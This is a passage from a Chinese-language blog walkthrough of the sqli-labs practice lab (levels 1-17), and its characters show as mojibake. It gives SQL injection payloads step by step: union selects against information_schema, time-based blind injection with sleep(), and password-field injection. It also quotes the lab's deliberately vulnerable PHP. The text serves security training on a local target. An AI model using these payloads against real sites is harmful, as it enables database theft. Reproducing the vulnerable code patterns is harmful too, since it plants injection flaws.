if(expr1,expr2,expr3)ï¼šå½“è¯­å¥1è¿”å›çš„ç»“æœä¸ºtrueæ—¶ï¼Œæ‰§è¡Œè¯­å¥2ï¼Œåä¹‹åˆ™æ‰§è¡Œè¯­å¥3 sleep(x)ï¼šå»¶è¿Ÿæ‰§è¡Œè„šæœ¬xç§’ æ—¶é—´ç›²æ³¨æœ‰ä¸ªå¾ˆæ˜¾è‘—çš„ä¼˜ç‚¹ï¼Œä¸éœ€è¦é€šè¿‡é¡µé¢å›æ˜¾æ¥åˆ¤æ–­ï¼Œåœ¨é¡µé¢æ²¡æœ‰å›æ˜¾å†…å®¹çš„æ—¶å€™ï¼Œæ—¶é—´ç›²æ³¨å°±å¯ä»¥å¾ˆå¥½çš„å¸®åŠ©æˆ‘ä»¬è¿›è¡Œåˆ¤æ–­ã€‚ä¾‹å¦‚æˆ‘ä»¬åŒæ ·æ¥åˆ¤æ–­æ•°æ®åº“ä¸­è¡¨çš„ä¸ªæ•°ï¼š 1if(n=(select count(table_name) from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27;),sleep(3),1) æ˜¾è€Œæ˜“è§ï¼Œå½“æ•°æ®åº“ä¸­è¡¨çš„ä¸ªæ•°ä¸ºnæ—¶ï¼Œè„šæœ¬å°†æš‚åœ3ç§’å†æ‰§è¡Œï¼Œå¦åˆ™ä»€ä¹ˆéƒ½ä¸ä¼šå‘ç”Ÿï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è§‚å¯Ÿç½‘é¡µçš„åŠ è½½æ—¶é—´æ¥åˆ¤æ–­è¿”å›å€¼æ˜¯trueè¿˜æ˜¯falseã€‚ è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬åªè¦å°†if()ä¸­çš„è¯­å¥1è¿›è¡Œæ›´æ”¹ï¼Œå°±å¯ä»¥åƒless-8ä¸€æ ·é€æ­¥è·å¾—æ•°æ®åº“ä¸­çš„ä¿¡æ¯äº†ã€‚ less-10æŠŠå•å¼•å·æ¢æˆåŒå¼•å·ï¼Œç„¶åæŠŠless-9çš„è¿‡ç¨‹èµ°ä¸€éï¼Œç„¶åä½ å°±æˆåŠŸåˆåšå‡ºäº†ä¸€å…³ï¼Œè¿™çœŸæ˜¯ä»¤äººæ„Ÿåˆ°é«˜å…´å‘¢ï¼ˆbushiï¼‰ã€‚ less11-16ä¸è¯´åºŸè¯ï¼Œç›´æ¥ä¸Šä»£ç ï¼Œä»¥less-12çš„ä»£ç ä¸ºä¾‹ï¼Œä¸‹é¢ä¹Ÿä»¥less-12ä¸ºä¾‹è¿›è¡Œåˆ†æï¼Œå…¶ä»–çš„å…³å¡éƒ½å¯ä»¥å‡­å€Ÿé¢˜ç›®è¿›è¡Œæ³¨å…¥ï¼Œå› æ­¤ä¸å†è¯¦è§£ï¼š 12345678910111213if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;];...... // connectivity $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;; $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); æˆ‘ä»¬å¯ä»¥å‘ç°ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼ŒPOSTä¸GETçš„å·®åˆ«ä¸æ˜¯å¾ˆå¤§ï¼Œä½œä¸ºHTTPè¯·æ±‚çš„ä¸¤ç§åŸºæœ¬æ–¹æ³•ï¼Œä»–ä»¬æœ€å¤§çš„åŒºåˆ«å°±åœ¨äºGETæ˜¯æŠŠå‚æ•°å†™è¿›äº†URLä¸­ï¼Œä»æŒ‡å®šçš„èµ„æºè¯·æ±‚æ•°æ®ï¼Œè€ŒPOSTæ˜¯å‘æŒ‡å®šçš„èµ„æºæäº¤è¦è¢«å¤„ç†çš„æ•°æ®ï¼Œæ˜¯è¦æˆ‘ä»¬ä¸Šä¼ æ•°æ®çš„ã€‚ä¸¤è€…å…·ä½“çš„åŒºåˆ«å¯ä»¥é€šè¿‡ä¸‹é¢è¿™ç¯‡æ–‡ç« å­¦ä¹ ï¼šHTTPï¼šGETå¯¹æ¯”POST è¿›å…¥é¶åœºæˆ‘ä»¬å¯ä»¥å‘ç°å¤šå‡ºäº†ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸ªè´¦å·å¯†ç äº†ï¼Œè€Œä¸æ˜¯åœ¨åŸŸåä¸­è¾“å…¥ä¸€ä¸ªidã€‚é€šè¿‡ä¸Šé¢çš„ä»£ç ï¼Œæ¯”å¦‚å½“æˆ‘ä»¬è¾“å…¥è´¦å·ä¸º1ï¼Œå¯†ç ä¸º1åï¼Œå°±ç›¸å½“äºPOSTäº†ä¸€ä¸ª$uname=1&amp;$passwd=1ï¼Œå¹¶ä¸”ä¼ å…¥sqlä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¸è¿‡æ˜¾ç„¶æ•°æ®åº“ä¸­æ²¡æœ‰è¿™ä¸€ç»„è´¦å·å¯†ç ï¼Œå› æ­¤æç¤ºæˆ‘ä»¬ç™»å½•å¤±è´¥äº†ã€‚ æ³¨å…¥çš„å…³é”®è¿˜æ˜¯é‚£è¡ŒæŸ¥è¯¢ä»£ç ã€‚æˆ‘ä»¬å‘ç°æŸ¥è¯¢ä»£ç ä¸­é¦–å…ˆå¯¹æˆ‘ä»¬POSTçš„ä¸¤ä¸ªå˜é‡æ·»åŠ äº†åŒå¼•å·å¹¶ä¸”æ‰“ä¸Šäº†æ‹¬å·ï¼Œæ¥ç€å¯ä»¥å‘ç°$unameåœ¨$passwdçš„å‰é¢ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬ä»è¾“å…¥è´¦æˆ·çš„é‚£ä¸€æ æ·»åŠ æ³¨é‡Šå¯ä»¥å±è”½æ‰å¯†ç æ ã€‚çŸ¥é“è¿™äº›åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹è¿›è¡Œæ³¨å…¥äº†æ³¨æ„ï¼šåœ¨ä½¿ç”¨æ³¨é‡Šâ€œâ€“+â€æ—¶ç”¨ç©ºæ ¼ä»£æ›¿â€œ+â€å·ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨å…¶ä»–æ³¨é‡Šæ–¹æ³•ã€‚ æ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨order byçˆ†å­—æ®µï¼Œå¯ä»¥å‘ç°è¿™æ¬¡çš„å­—æ®µæ•°ä¸º2ï¼šè¿™é‡Œä¹Ÿæ¨èä½¿ç”¨ç«ç‹ä¸­çš„æ’ä»¶hackbarï¼Œå¯ä»¥å»ç½‘ä¸Šè‡ªè¡Œæœå¯»æ—§ç‰ˆæœ¬å…è´¹è¯•ç”¨ï¼Œæ–°ç‰ˆæœ¬éœ€è¦æ”¶è´¹ã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œå‰©ä¸‹çš„äº‹æƒ…å°±æ˜¯ç†Ÿæ‚‰çš„çˆ†åº“äº†ã€‚ç†Ÿç»ƒè¿ç”¨ä¹‹å‰é¶åœºä¸­å­¦ä¼šçš„æŸ¥è¯¢ã€ç›²æ³¨ç­‰å¤šç§æ–¹æ³•ã€‚ç‰¹åˆ«æç¤ºï¼Œå¦‚æœåœ¨åšç¬¬åå››å…³æ—¶å‘ç°æ ‡é¢˜å’Œç¬¬åä¸‰å…³ä¸€æ ·ï¼Œé‚£è¯·ä½ åƒä¸‡ä¸è¦ç›¸ä¿¡æ ‡é¢˜ã€‚ less-17ç¬¬åä¸ƒå…³å®ƒåˆä¸ä¸€æ ·äº†ã€‚é¦–å…ˆï¼Œå½“ä½ åœ¨è¿›è¡Œåˆå§‹æµ‹è¯•æ—¶ï¼Œå®ƒä¼šå¯¹ä½ è¿›è¡Œæ— æƒ…å˜²è®½ï¼Œè®©ä½ ä¸Šå¤´ï¼Œä½†æ¥ç€ä½ å‘ç°æ— è®ºæ€æ ·åœ¨è´¦æˆ·ä¸­æ³¨å…¥ï¼Œéƒ½åªæœ‰å¯¹ä½ çš„å˜²è®½å‡ºç°ã€‚ä½ ä¸å¾—ä¸å†·é™ä¸‹æ¥ï¼Œç¿»å¼€æºç ï¼š 123456789101112131415161718192021222324function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; æˆ‘ä»¬å‘ç°äº†è¿™æ®µcheck_inputå‡½æ•°ï¼Œå¹¶ä¸”è¿˜å‘ç°äº†$unameè¿™ä¸ªå˜é‡è¿›è¡Œäº†ä¸€æ¬¡check_inputå‡½æ•°ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœè¾“å…¥çš„å€¼ä¸ä¸ºç©ºï¼Œæˆªå–æœ€å¤š15ä¸ªå­—ç¬¦ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬æƒ³è¿›è¡Œæ³¨å…¥çš„è¯åªèƒ½ä¿è¯å­—ç¬¦åœ¨15ä¸ªä»¥å†…ï¼Œç°åœ¨å¯¹äºæˆ‘ä»¬æ¥è¯´è¿™å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚ æ¥ç€åˆ¤æ–­å½“å‰è®¾ç½®ä¸­get_magic_quotes_gpcæ˜¯å¦å¼€å¯äº†ï¼Œå¦‚æœå¼€å¯äº†çš„è¯å°†ä¼šä¸ºé€šè¿‡getã€postä¸cookieä¼ æ¥çš„æ•°æ®ä¸­çš„å¼•å·å‰åŠ å…¥åæ–œæ ï¼Œç›¸å½“äºè‡ªåŠ¨ä¸ºæ•°æ®è¿›è¡Œäº†ä¸€æ¬¡addslashes()ï¼Œå› æ­¤å¦‚æœå¼€å¯ï¼Œåˆ™é€šè¿‡stripslashes()å‡½æ•°åˆ å»å…¶ä¸­çš„åæ–œæ ã€‚ æœ€ååˆ¤æ–­è¾“å…¥çš„å€¼æ˜¯å¦ä¸ºåè¿›åˆ¶çº¯æ•°å­—ï¼Œå¦‚æœä¸æ˜¯åˆ™å°†å€¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œå¦åˆ™å–æ•´ã€‚ä»¥ä¸‹è¿™äº›å­—ç¬¦ä¼šè¢«mysql_real_escape_string()è½¬ä¹‰ï¼š\\x00ï¼ˆç©ºå€¼ï¼‰ï¼Œ\\nï¼ˆæ¢è¡Œï¼‰ï¼Œ\\rï¼ˆå›è½¦ï¼‰ ï¼Œåæ–œæ ï¼Œå•å¼•å·ï¼ŒåŒå¼•å·ï¼Œ\\x1aï¼ˆåå…­è¿›åˆ¶ï¼‰ è¿™æ®µå‡½æ•°å¯¹ç”¨æˆ·åå®è¡Œäº†ä¿æŠ¤ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ä»ç”¨æˆ·åä¸­å…¥æ‰‹äº†ï¼Œä½†æ˜¯ç¿»çœ‹æºç ï¼Œå®ƒå±…ç„¶æ²¡æœ‰ä¿æŠ¤å¯†ç ã€‚å› æ­¤æˆ‘ä»¬åªè¦è·å¾—ä¸€ä¸ªåˆæ³•çš„ç”¨æˆ·åï¼Œå°±å¯ä»¥ä»å¯†ç æ å…¥æ‰‹äº†ï¼š 1$uname=admin&amp;$passwd=&#x27; order by 3# å¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹çˆ†åº“äº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqli-labsç»ƒä¹ -less1-7","slug":"sqli-labsç»ƒä¹ -less1-7","date":"2021-09-26T08:25:32.000Z","updated":"2021-11-19T15:00:19.797Z","comments":true,"path":"2021/09/26/sqli-labsç»ƒä¹ -less1-7/","link":"","permalink":"http://example.com/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1-7/","excerpt":"å‰è¨€åœ¨å­¦ä¹ å®Œphpçš„åŸºæœ¬è¯­è¨€å’Œmysqlå¢åˆ æŸ¥æ”¹è¯­å¥åï¼Œæˆ‘ä»¬å·²ç»åˆæ­¥å…·å¤‡äº†é¶åœºç»ƒä¹ çš„èƒ½åŠ›ï¼Œè®©æˆ‘ä»¬å…ˆä»sqli-labså¼€å§‹ç»ƒä¹ SQLæ³¨å…¥ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ å…³äºSQLæ³¨å…¥åœ¨ç»ƒä¹ é¶åœºä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆè¦äº†è§£ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ã€‚SQLæ³¨å…¥å¸¸å¸¸å‘ç”Ÿåœ¨é€šè¿‡ç½‘é¡µè·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®å¹¶å°†å…¶æ’å…¥MySQLæ•°æ®åº“ä¸­ï¼Œé»‘å®¢é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°åŸŸåã€webè¡¨å•ç­‰æ‰‹æ®µè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨çš„ç›®çš„ï¼Œå› æ­¤ç½‘ç«™éƒ½ä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤æ¥è¿›è¡Œä¿æŠ¤ã€‚","text":"å‰è¨€åœ¨å­¦ä¹ å®Œphpçš„åŸºæœ¬è¯­è¨€å’Œmysqlå¢åˆ æŸ¥æ”¹è¯­å¥åï¼Œæˆ‘ä»¬å·²ç»åˆæ­¥å…·å¤‡äº†é¶åœºç»ƒä¹ çš„èƒ½åŠ›ï¼Œè®©æˆ‘ä»¬å…ˆä»sqli-labså¼€å§‹ç»ƒä¹ SQLæ³¨å…¥ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ å…³äºSQLæ³¨å…¥åœ¨ç»ƒä¹ é¶åœºä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆè¦äº†è§£ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ã€‚SQLæ³¨å…¥å¸¸å¸¸å‘ç”Ÿåœ¨é€šè¿‡ç½‘é¡µè·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®å¹¶å°†å…¶æ’å…¥MySQLæ•°æ®åº“ä¸­ï¼Œé»‘å®¢é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°åŸŸåã€webè¡¨å•ç­‰æ‰‹æ®µè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨çš„ç›®çš„ï¼Œå› æ­¤ç½‘ç«™éƒ½ä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤æ¥è¿›è¡Œä¿æŠ¤ã€‚ è€Œåœ¨ç»ƒä¹ é¶åœºä¸­ï¼Œæˆ‘ä»¬å°±éœ€è¦é€šè¿‡SQLæ³¨å…¥çš„æ–¹å¼è·å¾—æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥å…·ä½“åˆ†æsqli-labsé¶åœºä¸­çš„ç¬¬ä¸€å…³æ¥æ·±åˆ»è®¤è¯†SQLæ³¨å…¥ã€‚ less1-4é¦–å…ˆè¿›å…¥less-1çš„ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€è¡Œå­—ï¼š Please input the ID as parameter with numeric value é‚£ä¹ˆæˆ‘ä»¬å°±æŒ‰ç…§è¿™å¥è¯çš„æ„æ€ï¼šè¯·è¾“å…¥IDä½œä¸ºå¸¦æ•°å€¼çš„å‚æ•°ï¼Œåœ¨åŸŸåä¸­è¾“å…¥ä¸€ä¸ªIDï¼šhttp://127.0.0.1/Less-1/?id=1æ¥ç€æŒ‰ä¸‹å›è½¦åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¡µé¢ä¸­å‡ºç°äº†ä¸€å¯¹è´¦å·å¯†ç ï¼š è€Œæ ¹æ®æç¤ºï¼ˆGET-Error based-Single quotes-String)å¯ä»¥çŸ¥é“ï¼Œè¿™é“å…³å¡æ˜¯è¦åˆ©ç”¨æºç ä¸­åŸºäºå•å¼•å·çš„é”™è¯¯æ¥è¿›è¡Œè§£å†³ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•åœ¨åŸŸåç»“å°¾åŠ ä¸Šä¸€ä¸ª&#39;http://127.0.0.1/Less-1/?id=1&#39;å›è½¦åæˆ‘ä»¬å°±å¯ä»¥å‘ç°ç½‘ç«™æŠ¥é”™äº†ï¼Œå¦‚æœæ²¡æœ‰æŠ¥é”™çš„è¯ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„é“¾æ¥å…³é—­phpçš„å¼•å·ä¿æŠ¤ï¼šå…³äºSqli-labså•å¼•å·ä¸æŠ¥é”™çš„é—®é¢˜è€Œå¦‚æœæŠ¥é”™çš„è¯ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä»¥ä¸‹è¿™æ®µæ–‡å­—ï¼š You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™1â€™â€™ LIMIT 0,1â€™ at line 1 é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸€æ®µæ–‡å­—å‘¢ï¼Œæˆ‘ä»¬å€ŸåŠ©æ–‡ä»¶çš„æºç è¿›è¡Œåˆ†æ: 123456789101112131415161718192021222324252627282930if(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row) &#123; echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125; é€šè¿‡åˆ†æä»¥ä¸Šéƒ¨åˆ†æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå½“ä½ è¾“å…¥ä¸€ä¸ªidæ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¾—åˆ°äº†ä¸€ä¸ªidï¼Œifå‡½æ•°æ‰§è¡Œtrueä¸‹çš„ä»£ç æ®µï¼Œå°†æœ¬æ¬¡æŸ¥è¯¢è®°å½•åˆ°resultçš„txtæ–‡ä»¶ä¸­ï¼Œå¹¶ä»æ•°æ®åº“ä¸­æŸ¥è¯¢ï¼Œæ˜¾ç¤ºä¿¡æ¯ã€‚å› æ­¤å½“æˆ‘ä»¬è¾“å…¥?id=1æ—¶ç½‘é¡µèƒ½å¤Ÿè¿”å›è´¦å·å¯†ç ã€‚è€Œå½“æˆ‘ä»¬è¾“å…¥?id=1â€™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç¬¬11è¡Œä»£ç å¾—åˆ°idä¸º1â€™åï¼Œå³æŠŠ$idæ›¿æ¢ä¸º1â€™åï¼Œä»£ç ä¸­å‡ºç°äº†ä¸‰ä¸ªå•å¼•å·ï¼Œè¿™å°±å°†å¯¼è‡´å•å¼•å·æ— æ³•æ­£ç¡®å¯¹åº”ï¼Œå¼•èµ·æŠ¥é”™ã€‚ æ—¢ç„¶å¤šè¾“å…¥äº†ä¸€ä¸ªå•å¼•å·ï¼Œæˆ‘ä»¬å°±è¦æƒ³åŠæ³•æŠŠå¤šä½™å‡ºæ¥çš„é‚£ä¸ªå•å¼•å·æ’é™¤æ‰ï¼Œåœ¨SQLæ³¨å…¥ä¸­ï¼Œæœ€å¸¸ç”¨çš„æ–¹æ³•ä¾¿æ˜¯æ³¨é‡Šï¼Œæˆ‘ä»¬åœ¨åŸŸåæœ€åæ·»åŠ ä¸Šæ³¨é‡Šç¬¦ï¼š 1http://127.0.0.1/Less-1/?id=1%27--+ æˆ–è€…æˆ‘ä»¬å¯ä»¥å°†â€“+æ›¿æ¢ä¸º#ï¼ˆ%23ï¼‰ è¿™æ ·æˆ‘ä»¬å‘ç°ï¼Œå›è½¦åçš„é¡µé¢é‡æ–°æ˜¾ç¤ºæ­£å¸¸ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥è¿›è¡Œæµ‹è¯•åˆ¤æ–­æ­¤å¤„æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨and 1=1å’Œand 1=2è¿›è¡Œåˆ¤æ–­ï¼Œå…¶ä¸­1=1è¡¨ç¤ºæ’ä¸ºçœŸï¼Œ1=2è¡¨ç¤ºæ’ä¸ºå‡ã€‚é€šè¿‡ä¸‹ä¸¤å›¾æˆ‘ä»¬å¯ä»¥å‘ç°ä¸¤è€…æ˜¾ç¤ºé¡µé¢ä¸åŒï¼Œè¯´æ˜åœ¨æ­¤å¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼š æ—¢ç„¶å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæˆ‘ä»¬å°±è¦æƒ³åŠæ³•åœ¨æ­¤å¤„è·å–æˆ‘ä»¬éœ€è¦çš„æ•°æ®ã€‚ç”±äºç¬¬11è¡Œè¿™å¥ä»£ç æœ¬èº«å°±æ˜¯selectè¯­å¥ï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶éœ€è¦è¿ç”¨åˆ°unionè¯­å¥æ¥åˆå¹¶ä¸¤ä¸ªselectè¯­å¥çš„ç»“æœã€‚ä¸è¿‡è¦æ³¨æ„ï¼Œä½¿ç”¨unionè¯­å¥çš„å…ˆå†³æ¡ä»¶æ˜¯è¯­å¥å†…éƒ¨çš„SELECTè¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆè·å–è¡¨æ ¼ä¸­çš„å­—æ®µæ•°ã€‚ä½¿ç”¨order byè¯­å¥è¿›è¡Œå­—æ®µæ•°æŸ¥è¯¢ï¼Œå½“æˆ‘ä»¬æµ‹è¯•åˆ°order by 4æ—¶ï¼Œå‘ç°æ–‡æ¡£é¡µé¢å‡ºç°äº†ä»¥ä¸‹çš„æç¤ºï¼š Unknown column â€˜4â€™ in â€˜order clauseâ€™ æ— æ³•è¯†åˆ«ç¬¬4åˆ—ï¼Œè¿™å°±è¯´æ˜è¡¨æ ¼ä¸­åªæœ‰3åˆ—ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿ç”¨unionè¯­å¥æ¥è¿›è¡Œæ³¨å…¥ã€‚é¦–å…ˆæˆ‘ä»¬å°†idæ”¹ä¸º-1ï¼Œæ¥ç€æ³¨å…¥ä»¥ä¸‹ä»£ç æ¥è·å–æ˜¾ç¤ºé¡µé¢å¯¹åº”çš„å­—æ®µï¼š 1union select 1,2,3 å¯ä»¥å‘ç°è´¦æˆ·ä¸å¯†ç ä¸¤åˆ—å¯¹åº”çš„å­—æ®µæ•°ä¸º2å’Œ3ï¼Œé‚£ä¹ˆåœ¨ä¸‹è¿°çš„æ“ä½œä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†unionè¯­å¥ä¸­çš„2æˆ–3æ›¿æ¢æˆæ–°çš„selectè¯­å¥æ¥è·å–æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å°†ä¸Šè¿°åŸŸåä¸­çš„2æ›¿æ¢ä¸ºä¸‹åˆ—ä»£ç æ¥æŸ¥è¯¢å…¨éƒ¨æ•°æ®åº“çš„åç§°ï¼š 1(select group_concat(schema_name) from information_schema.schemata) æˆ–è€…ä½¿ç”¨å°†2æ›¿æ¢ä¸ºdatabase()æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„åç§° è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†æˆ‘ä»¬è¦æŸ¥æ‰¾çš„æ•°æ®åº“çš„åç§°ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œæ•°æ®å­˜åœ¨äºæ•°æ®è¡¨é‡Œï¼Œè€Œæ•°æ®è¡¨åˆå­˜åœ¨äºæ•°æ®åº“é‡Œï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦è·å¾—æ•°æ®åº“å†…æ‰€æœ‰è¡¨çš„åç§°ã€‚æˆ‘ä»¬å¯ä»¥å°†åŸæ¥2çš„ä½ç½®ç»§ç»­æ›¿æ¢æˆä¸‹åˆ—ä»£ç è¿›è¡ŒæŸ¥è¯¢ï¼š 1select group_concat(table_name) from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27; å–å¾—äº†è¡¨åä¹‹åæˆ‘ä»¬å°±å¯ä»¥æƒ³åŠæ³•è·å¾—å…¶ä¸­çš„æ•°æ®äº†ï¼Œæ•°æ®å‚¨å­˜åœ¨æ•°æ®è¡¨çš„åˆ—å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç»§ç»­è·å¾—åˆ—åï¼Œè¿™é‡Œæˆ‘ä»¬è·å–usersè¡¨ä¸­çš„åˆ—åï¼ŒåŒæ ·æ›¿æ¢åŸæ¥2çš„ä½ç½®ï¼š 1select group_concat(column_name) from information_schema.columns where table_schema=&#x27;æ•°æ®åº“å&#x27; and table_name=&#x27;è¡¨å&#x27; åšåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«çš„è·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯äº† 1select group_concat(åˆ—å) from æ•°æ®åº“å.æ•°æ®è¡¨å less-2æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œless-3æ˜¯å•å¼•å·æ‹¬å·é—­åˆæ³¨å…¥ï¼Œless-4æ˜¯åŒå¼•å·æ‹¬å·é—­åˆæ³¨å…¥ã€‚zè¿™å‡ å…³çš„è€ƒç‚¹æ˜¯è”åˆæ³¨å…¥ã€‚ less5-6æ–¹æ³•1è¿›å…¥ç¬¬äº”ä¸ªé¶åœºï¼Œåœ¨æˆ‘ä»¬è¾“å…¥idä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€åˆ‡éƒ½å˜äº†ï¼Œå±å¹•ä¸Šåªå‰©ä¸‹ä¸€å¥â€œYou are inâ€¦â€¦..â€å’Œåœ¨å±å¹•å‰ä¸€è„¸æ‡µçš„æˆ‘ä»¬ã€‚é‡åˆ°è¿™ç§æƒ…å†µå…ˆä¸è¦æƒŠæ…Œï¼Œè¿˜è®°å¾—æç¤ºå†…å®¹ä¾ç„¶æŒ‡å‘äº†å•å¼•å·ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬ä¾ç„¶åœ¨åŸŸåæœ€åå…ˆåŠ ä¸Šä¸€ä¸ªå•å¼•å·ã€‚ å›è½¦æ¥äº†ï¼ŒæŠ¥é”™å°±æœ‰äº†ã€‚è¿™æ˜¯ä¸€æ®µä¸less-1å®Œå…¨ä¸€è‡´çš„æŠ¥é”™ï¼ŒåŠ ä¸Šæ³¨é‡Šåå›æ˜¾æ¢å¤æ­£å¸¸ï¼Œå†ç”¨and 1=1å’Œand 1=2æ£€éªŒåå¯ä»¥ç¡®å®šè¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ã€‚æ—¢ç„¶å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œé‚£å°±æœ‰è§£å¼€å®ƒçš„æ–¹æ³•ã€‚ä½†æ˜¯æ˜¾ç„¶ï¼Œä¸ç®¡æˆ‘ä»¬æ€æ ·æ›´æ”¹idçš„å€¼ï¼Œå¾—åˆ°çš„æ°¸è¿œåªæœ‰é‚£å¥â€œYou are inâ€¦â€¦..â€ã€‚ 